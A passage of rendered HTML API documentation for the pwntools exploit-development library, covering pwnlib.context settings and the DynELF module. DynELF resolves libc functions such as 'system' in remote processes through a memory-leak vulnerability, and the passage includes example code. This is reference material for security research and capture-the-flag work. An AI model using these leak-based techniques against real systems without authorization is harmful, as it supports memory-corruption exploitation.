<span class="gp">&gt;&gt;&gt; </span><span class="n">r</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;google.com&#39;</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s1">&#39;error&#39;</span><span class="p">)</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.quiet">
<code class="descclassname">ContextType.</code><code class="descname">quiet</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.quiet" title="Permalink to this definition">¶</a></dt>
<dd><p>Disables all non-error logging within the enclosed scope,
<em>unless</em> the debugging level is set to &#8216;debug&#8217; or lower.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.randomize">
<code class="descclassname">ContextType.</code><code class="descname">randomize</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.randomize" title="Permalink to this definition">¶</a></dt>
<dd><p>Global flag that lots of things should be randomized.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.rename_corefiles">
<code class="descclassname">ContextType.</code><code class="descname">rename_corefiles</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.rename_corefiles" title="Permalink to this definition">¶</a></dt>
<dd><p>Whether pwntools automatically renames corefiles.</p>
<p>This is useful for two things:</p>
<ul class="simple">
<li>Prevent corefiles from being overwritten, if <code class="docutils literal"><span class="pre">kernel.core_pattern</span></code>
is something simple like <code class="docutils literal"><span class="pre">&quot;core&quot;</span></code>.</li>
<li>Ensure corefiles are generated, if <code class="docutils literal"><span class="pre">kernel.core_pattern</span></code> uses <code class="docutils literal"><span class="pre">apport</span></code>,
which refuses to overwrite any existing files.</li>
</ul>
<p>This only affects corefiles accessed via <a class="reference internal" href="index.html#pwnlib.tubes.process.process.corefile" title="pwnlib.tubes.process.process.corefile"><code class="xref py py-attr docutils literal"><span class="pre">process.corefile</span></code></a>.</p>
<p>Default value is <code class="docutils literal"><span class="pre">True</span></code>.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.sign">
<code class="descclassname">ContextType.</code><code class="descname">sign</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.sign" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference internal" href="#pwnlib.context.ContextType.signed" title="pwnlib.context.ContextType.signed"><code class="xref py py-attr docutils literal"><span class="pre">signed</span></code></a></p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.signed">
<code class="descclassname">ContextType.</code><code class="descname">signed</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.signed" title="Permalink to this definition">¶</a></dt>
<dd><p>Signed-ness for packing operation when it&#8217;s not explicitly set.</p>
<p>Can be set to any non-string truthy value, or the specific string
values <code class="docutils literal"><span class="pre">'signed'</span></code> or <code class="docutils literal"><span class="pre">'unsigned'</span></code> which are converted into
<code class="xref py py-const docutils literal"><span class="pre">True</span></code> and <code class="xref py py-const docutils literal"><span class="pre">False</span></code> correspondingly.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">signed</span>
<span class="go">False</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">signed</span> <span class="o">=</span> <span class="mi">1</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">signed</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">signed</span> <span class="o">=</span> <span class="s1">&#39;signed&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">signed</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">signed</span> <span class="o">=</span> <span class="s1">&#39;unsigned&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">signed</span>
<span class="go">False</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">signed</span> <span class="o">=</span> <span class="s1">&#39;foobar&#39;</span> 
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">AttributeError</span>: <span class="n">signed must be one of [&#39;no&#39;, &#39;signed&#39;, &#39;unsigned&#39;, &#39;yes&#39;] or a non-string truthy value</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.signedness">
<code class="descclassname">ContextType.</code><code class="descname">signedness</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.signedness" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference internal" href="#pwnlib.context.ContextType.signed" title="pwnlib.context.ContextType.signed"><code class="xref py py-attr docutils literal"><span class="pre">signed</span></code></a></p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.signednesses">
<code class="descclassname">ContextType.</code><code class="descname">signednesses</code><em class="property"> = {'yes': True, 'unsigned': False, 'signed': True, 'no': False}</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.signednesses" title="Permalink to this definition">¶</a></dt>
<dd><p>Valid string values for <a class="reference internal" href="#pwnlib.context.ContextType.signed" title="pwnlib.context.ContextType.signed"><code class="xref py py-attr docutils literal"><span class="pre">signed</span></code></a></p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.silent">
<code class="descclassname">ContextType.</code><code class="descname">silent</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.silent" title="Permalink to this definition">¶</a></dt>
<dd><p>Disable all non-error logging within the enclosed scope.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.terminal">
<code class="descclassname">ContextType.</code><code class="descname">terminal</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.terminal" title="Permalink to this definition">¶</a></dt>
<dd><p>Default terminal used by <a class="reference internal" href="index.html#pwnlib.util.misc.run_in_new_terminal" title="pwnlib.util.misc.run_in_new_terminal"><code class="xref py py-meth docutils literal"><span class="pre">pwnlib.util.misc.run_in_new_terminal()</span></code></a>.
Can be a string or an iterable of strings.  In the latter case the first
entry is the terminal and the rest are default arguments.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.timeout">
<code class="descclassname">ContextType.</code><code class="descname">timeout</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.timeout" title="Permalink to this definition">¶</a></dt>
<dd><p>Default amount of time to wait for a blocking operation before it times out,
specified in seconds.</p>
<p>The default value is to have an infinite timeout.</p>
<p>See <a class="reference internal" href="index.html#pwnlib.timeout.Timeout" title="pwnlib.timeout.Timeout"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.timeout.Timeout</span></code></a> for additional information on
valid values.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.verbose">
<code class="descclassname">ContextType.</code><code class="descname">verbose</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.verbose" title="Permalink to this definition">¶</a></dt>
<dd><p>Enable all logging within the enclosed scope.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.context.ContextType.word_size">
<code class="descclassname">ContextType.</code><code class="descname">word_size</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.ContextType.word_size" title="Permalink to this definition">¶</a></dt>
<dd><p>Alias for <a class="reference internal" href="#pwnlib.context.ContextType.bits" title="pwnlib.context.ContextType.bits"><code class="xref py py-attr docutils literal"><span class="pre">bits</span></code></a></p>
</dd></dl>

</dd></dl>

<dl class="class">
<dt id="pwnlib.context.Thread">
<em class="property">class </em><code class="descclassname">pwnlib.context.</code><code class="descname">Thread</code><span class="sig-paren">(</span><em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.Thread" title="Permalink to this definition">¶</a></dt>
<dd><p>Instantiates a context-aware thread, which inherit its context when it is
instantiated. The class can be accessed both on the context module as
<cite>pwnlib.context.Thread</cite> and on the context singleton object inside the
context module as <cite>pwnlib.context.context.Thread</cite>.</p>
<p>Threads created by using the native :class`threading`.Thread` will have a
clean (default) context.</p>
<p>Regardless of the mechanism used to create any thread, the context
is de-coupled from the parent thread, so changes do not cascade
to child or parent.</p>
<p>Saves a copy of the context when instantiated (at <code class="docutils literal"><span class="pre">__init__</span></code>)
and updates the new thread&#8217;s context before passing control
to the user code via <code class="docutils literal"><span class="pre">run</span></code> or <code class="docutils literal"><span class="pre">target=</span></code>.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;arm&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">def</span> <span class="nf">p</span><span class="p">():</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="n">context</span><span class="o">.</span><span class="n">arch</span>
<span class="gp">... </span>    <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;mips&#39;</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="n">context</span><span class="o">.</span><span class="n">arch</span>
<span class="gp">&gt;&gt;&gt; </span><span class="c1"># Note that a normal Thread starts with a clean context</span>
<span class="gp">&gt;&gt;&gt; </span><span class="c1"># (i386 is the default architecture)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">p</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span><span class="o">=</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">(),</span> <span class="n">t</span><span class="o">.</span><span class="n">join</span><span class="p">())</span>
<span class="go">i386</span>
<span class="go">mips</span>
<span class="gp">&gt;&gt;&gt; </span><span class="c1"># Note that the main Thread&#39;s context is unchanged</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">context</span><span class="o">.</span><span class="n">arch</span>
<span class="go">arm</span>
<span class="gp">&gt;&gt;&gt; </span><span class="c1"># Note that a context-aware Thread receives a copy of the context</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">p</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span><span class="o">=</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">(),</span> <span class="n">t</span><span class="o">.</span><span class="n">join</span><span class="p">())</span>
<span class="go">arm</span>
<span class="go">mips</span>
<span class="gp">&gt;&gt;&gt; </span><span class="c1"># Again, the main thread is unchanged</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">context</span><span class="o">.</span><span class="n">arch</span>
<span class="go">arm</span>
</pre></div>
</div>
<p>Implementation Details:</p>
<blockquote>
<div><p>This class implemented by hooking the private function
<code class="xref py py-func docutils literal"><span class="pre">threading.Thread._Thread_bootstrap()</span></code>, which is called before
passing control to <code class="xref py py-func docutils literal"><span class="pre">threading.Thread.run()</span></code>.</p>
<p>This could be done by overriding <code class="docutils literal"><span class="pre">run</span></code> itself, but we would have to
ensure that all uses of the class would only ever use the keyword
<code class="docutils literal"><span class="pre">target=</span></code> for <code class="docutils literal"><span class="pre">__init__</span></code>, or that all subclasses invoke
<code class="docutils literal"><span class="pre">super(Subclass.self).set_up_context()</span></code> or similar.</p>
</div></blockquote>
</dd></dl>

<dl class="data">
<dt id="pwnlib.context.context">
<code class="descclassname">pwnlib.context.</code><code class="descname">context</code><em class="property"> = ContextType()</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/context.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.context.context" title="Permalink to this definition">¶</a></dt>
<dd><p>Global <a class="reference internal" href="#pwnlib.context.ContextType" title="pwnlib.context.ContextType"><code class="xref py py-class docutils literal"><span class="pre">ContextType</span></code></a> object, used to store commonly-used pwntools settings.</p>
<p>In most cases, the context is used to infer default variables values.
For example, <a class="reference internal" href="index.html#pwnlib.asm.asm" title="pwnlib.asm.asm"><code class="xref py py-func docutils literal"><span class="pre">asm()</span></code></a> can take an <code class="docutils literal"><span class="pre">arch</span></code> parameter as a
keyword argument.</p>
<p>If it is not supplied, the <code class="docutils literal"><span class="pre">arch</span></code> specified by <code class="docutils literal"><span class="pre">context</span></code> is used instead.</p>
<p>Consider it a shorthand to passing <code class="docutils literal"><span class="pre">os=</span></code> and <code class="docutils literal"><span class="pre">arch=</span></code> to every single
function call.</p>
</dd></dl>

</div>
</div>
<span id="document-dynelf"></span><div class="section" id="module-pwnlib.dynelf">
<span id="pwnlib-dynelf-resolving-remote-functions-using-leaks"></span><h3><a class="reference internal" href="#module-pwnlib.dynelf" title="pwnlib.dynelf"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.dynelf</span></code></a> &#8212; Resolving remote functions using leaks<a class="headerlink" href="#module-pwnlib.dynelf" title="Permalink to this headline">¶</a></h3>
<p>Resolve symbols in loaded, dynamically-linked ELF binaries.
Given a function which can leak data at an arbitrary address,
any symbol in any loaded library can be resolved.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="c1"># Assume a process or remote connection</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwnme&#39;</span><span class="p">)</span>

<span class="c1"># Declare a function that takes a single address, and</span>
<span class="c1"># leaks at least one byte at that address.</span>
<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
    <span class="n">log</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%#x</span><span class="s2"> =&gt; </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="p">(</span><span class="n">data</span> <span class="ow">or</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)))</span>
    <span class="k">return</span> <span class="n">data</span>

<span class="c1"># For the sake of this example, let&#39;s say that we</span>
<span class="c1"># have any of these pointers.  One is a pointer into</span>
<span class="c1"># the target binary, the other two are pointers into libc</span>
<span class="n">main</span>   <span class="o">=</span> <span class="mh">0xfeedf4ce</span>
<span class="n">libc</span>   <span class="o">=</span> <span class="mh">0xdeadb000</span>
<span class="n">system</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span>

<span class="c1"># With our leaker, and a pointer into our target binary,</span>
<span class="c1"># we can resolve the address of anything.</span>
<span class="c1">#</span>
<span class="c1"># We do not actually need to have a copy of the target</span>
<span class="c1"># binary for this to work.</span>
<span class="n">d</span> <span class="o">=</span> <span class="n">DynELF</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="n">main</span><span class="p">)</span>
<span class="k">assert</span> <span class="n">d</span><span class="o">.</span><span class="n">lookup</span><span class="p">(</span><span class="kc">None</span><span class="p">,</span>     <span class="s1">&#39;libc&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="n">libc</span>
<span class="k">assert</span> <span class="n">d</span><span class="o">.</span><span class="n">lookup</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;libc&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="n">system</span>

<span class="c1"># However, if we *do* have a copy of the target binary,</span>
<span class="c1"># we can speed up some of the steps.</span>
<span class="n">d</span> <span class="o">=</span> <span class="n">DynELF</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="n">main</span><span class="p">,</span> <span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwnme&#39;</span><span class="p">))</span>
<span class="k">assert</span> <span class="n">d</span><span class="o">.</span><span class="n">lookup</span><span class="p">(</span><span class="kc">None</span><span class="p">,</span>     <span class="s1">&#39;libc&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="n">libc</span>
<span class="k">assert</span> <span class="n">d</span><span class="o">.</span><span class="n">lookup</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;libc&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="n">system</span>

<span class="c1"># Alternately, we can resolve symbols inside another library,</span>
<span class="c1"># given a pointer into it.</span>
<span class="n">d</span> <span class="o">=</span> <span class="n">DynELF</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1234</span><span class="p">)</span>
<span class="k">assert</span> <span class="n">d</span><span class="o">.</span><span class="n">lookup</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>      <span class="o">==</span> <span class="n">system</span>
</pre></div>
</div>
<p>DynELF</p>
<dl class="class">
<dt id="pwnlib.dynelf.DynELF">
<em class="property">class </em><code class="descclassname">pwnlib.dynelf.</code><code class="descname">DynELF</code><span class="sig-paren">(</span><em>leak</em>, <em>pointer=None</em>, <em>elf=None</em>, <em>libcdb=True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/dynelf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.dynelf.DynELF" title="Permalink to this definition">¶</a></dt>
<dd><p>DynELF knows how to resolve symbols in remote processes via an infoleak or
memleak vulnerability encapsulated by <a class="reference internal" href="index.html#pwnlib.memleak.MemLeak" title="pwnlib.memleak.MemLeak"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.memleak.MemLeak</span></code></a>.</p>
<p>Implementation Details:</p>
<blockquote>
<div><p>Resolving Functions:</p>
<blockquote>
<div><p>In all ELFs which export symbols for importing by other libraries,
(e.g. <code class="docutils literal"><span class="pre">libc.so</span></code>) there are a series of tables which give exported
symbol names, exported symbol addresses, and the <code class="docutils literal"><span class="pre">hash</span></code> of those
exported symbols.  By applying a hash function to the name of the
desired symbol (e.g., <code class="docutils literal"><span class="pre">'printf'</span></code>), it can be located in the hash
table.  Its location in the hash table provides an index into the
string name table (<a class="reference external" href="https://refspecs.linuxbase.org/elf/gabi4+/ch4.strtab.html">strtab</a>), and the symbol address (<a class="reference external" href="https://refspecs.linuxbase.org/elf/gabi4+/ch4.symtab.html">symtab</a>).</p>
<p>Assuming we have the base address of <code class="docutils literal"><span class="pre">libc.so</span></code>, the way to resolve
the address of <code class="docutils literal"><span class="pre">printf</span></code> is to locate the <code class="docutils literal"><span class="pre">symtab</span></code>, <code class="docutils literal"><span class="pre">strtab</span></code>,
and hash table. The string <code class="docutils literal"><span class="pre">&quot;printf&quot;</span></code> is hashed according to the
style of the hash table (<a class="reference external" href="https://refspecs.linuxbase.org/elf/gabi4+/ch5.dynamic.html#hash">SYSV</a> or <a class="reference external" href="https://blogs.oracle.com/ali/entry/gnu_hash_elf_sections">GNU</a>), and the hash table is
walked until a matching entry is located. We can verify an exact
match by checking the string table, and then get the offset into
<code class="docutils literal"><span class="pre">libc.so</span></code> from the <code class="docutils literal"><span class="pre">symtab</span></code>.</p>
</div></blockquote>
<p>Resolving Library Addresses:</p>
<blockquote>
<div><p>If we have a pointer into a dynamically-linked executable, we can
leverage an internal linker structure called the <a class="reference external" href="https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/link.h;h=eaca8028e45a859ac280301a6e955a14eed1b887;hb=HEAD#l84">link map</a>. This
is a linked list structure which contains information about each
loaded library, including its full path and base address.</p>
<p>A pointer to the <code class="docutils literal"><span class="pre">link</span> <span class="pre">map</span></code> can be found in two ways.  Both are
referenced from entries in the <a class="reference external" href="http://www.sco.com/developers/gabi/latest/ch5.dynamic.html#dynamic_section">DYNAMIC</a> array.</p>
<ul class="simple">
<li>In non-RELRO binaries, a pointer is placed in the <a class="reference external" href="https://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/specialsections.html">.got.plt</a> area
in the binary. This is marked by finding the <a class="reference external" href="http://refspecs.linuxfoundation.org/ELF/zSeries/lzsabi0_zSeries/x2251.html">DT_PLTGOT</a> area in the
binary.</li>
<li>In all binaries, a pointer can be found in the area described by
the <a class="reference external" href="https://reverseengineering.stackexchange.com/questions/6525/elf-link-map-when-linked-as-relro">DT_DEBUG</a> area.  This exists even in stripped binaries.</li>
</ul>
<p>For maximum flexibility, both mechanisms are used exhaustively.</p>
</div></blockquote>
</div></blockquote>
<p>Instantiates an object which can resolve symbols in a running binary
given a <a class="reference internal" href="index.html#pwnlib.memleak.MemLeak" title="pwnlib.memleak.MemLeak"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.memleak.MemLeak</span></code></a> leaker and a pointer inside
the binary.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>leak</strong> (<a class="reference internal" href="index.html#pwnlib.memleak.MemLeak" title="pwnlib.memleak.MemLeak"><em>MemLeak</em></a>) &#8211; Instance of pwnlib.memleak.MemLeak for leaking memory</li>
<li><strong>pointer</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; A pointer into a loaded ELF file</li>
<li><strong>elf</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a><em>,</em><a class="reference internal" href="index.html#pwnlib.elf.elf.ELF" title="pwnlib.elf.elf.ELF"><em>ELF</em></a>) &#8211; Path to the ELF file on disk, or a loaded <code class="xref py py-class docutils literal"><span class="pre">pwnlib.elf.ELF</span></code>.</li>
<li><strong>libcdb</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Attempt to use libcdb to speed up libc lookups</li>
</ul>
</td>
</tr>
</tbody>
</table>
<dl class="method">
<dt id="pwnlib.dynelf.DynELF.bases">
<code class="descname">bases</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/dynelf.py#L592-617"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.dynelf.DynELF.bases" title="Permalink to this definition">¶</a></dt>
<dd><p>Resolve base addresses of all loaded libraries.</p>
<p>Return a dictionary mapping library path to its base address.</p>
</dd></dl>

<dl class="staticmethod">
<dt id="pwnlib.dynelf.DynELF.find_base">
<em class="property">static </em><code class="descname">find_base</code><span class="sig-paren">(</span><em>leak</em>, <em>ptr</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/dynelf.py#L194-199"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.dynelf.DynELF.find_base" title="Permalink to this definition">¶</a></dt>
<dd><p>Given a <a class="reference internal" href="index.html#pwnlib.memleak.MemLeak" title="pwnlib.memleak.MemLeak"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.memleak.MemLeak</span></code></a> object and a pointer into a
library, find its base address.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.dynelf.DynELF.heap">
<code class="descname">heap</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/dynelf.py#L903-912"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.dynelf.DynELF.heap" title="Permalink to this definition">¶</a></dt>
<dd><p>Finds the beginning of the heap via __curbrk, which is an exported
symbol in the linker, which points to the current brk.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.dynelf.DynELF.lookup">
<code class="descname">lookup</code><span class="sig-paren">(</span><em>symb = None</em>, <em>lib = None</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/dynelf.py#L519-590"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.dynelf.DynELF.lookup" title="Permalink to this definition">¶</a></dt>
<dd><p>Find the address of <code class="docutils literal"><span class="pre">symbol</span></code>, which is found in <code class="docutils literal"><span class="pre">lib</span></code>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>symb</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Named routine to look up
If omitted, the base address of the library will be returned.</li>
<li><strong>lib</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Substring to match for the library name.
If omitted, the current library is searched.
If set to <code class="docutils literal"><span class="pre">'libc'</span></code>, <code class="docutils literal"><span class="pre">'libc.so'</span></code> is assumed.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">Address of the named symbol, or <code class="xref py py-const docutils literal"><span class="pre">None</span></code>.</p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.dynelf.DynELF.stack">
<code class="descname">stack</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/dynelf.py#L883-901"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.dynelf.DynELF.stack" title="Permalink to this definition">¶</a></dt>
<dd><p>Finds a pointer to the stack via __environ, which is an exported
symbol in libc, which points to the environment block.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.dynelf.DynELF.dynamic">
<code class="descname">dynamic</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/dynelf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.dynelf.DynELF.dynamic" title="Permalink to this definition">¶</a></dt>
<dd><p><em>Returns</em> &#8211; Pointer to the <code class="docutils literal"><span class="pre">.DYNAMIC</span></code> area.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.dynelf.DynELF.elfclass">
<code class="descname">elfclass</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/dynelf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.dynelf.DynELF.elfclass" title="Permalink to this definition">¶</a></dt>
<dd><p>32 or 64</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.dynelf.DynELF.elftype">
<code class="descname">elftype</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/dynelf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.dynelf.DynELF.elftype" title="Permalink to this definition">¶</a></dt>
<dd><p>e_type from the elf header. In practice the value will almost always
be &#8216;EXEC&#8217; or &#8216;DYN&#8217;. If the value is architecture-specific (between
ET_LOPROC and ET_HIPROC) or invalid, KeyError is raised.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.dynelf.DynELF.libc">
